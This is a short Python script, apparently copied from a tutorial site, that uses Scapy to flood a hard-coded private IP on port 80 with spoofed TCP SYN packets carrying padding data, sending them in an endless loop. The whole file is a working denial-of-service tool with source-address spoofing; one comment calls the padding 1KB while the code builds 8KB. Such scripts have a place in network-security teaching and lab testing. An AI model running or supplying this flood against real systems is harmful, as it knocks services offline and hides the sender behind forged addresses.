# https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

import scapy
from scapy.all import *

# target IP address (should be a testing router/firewall)
target_ip = "192.168.1.128"
# the target port u want to flood
target_port = 80
# forge IP packet with target ip as the destination IP address
#ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data (1KB in this case, don't increase it too much, 
# otherwise, it won't work.)
raw = Raw(b"XXXX"*2048)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
print("Sending packets, CTRL+C To Cancel")
send(p, loop=1, verbose=0)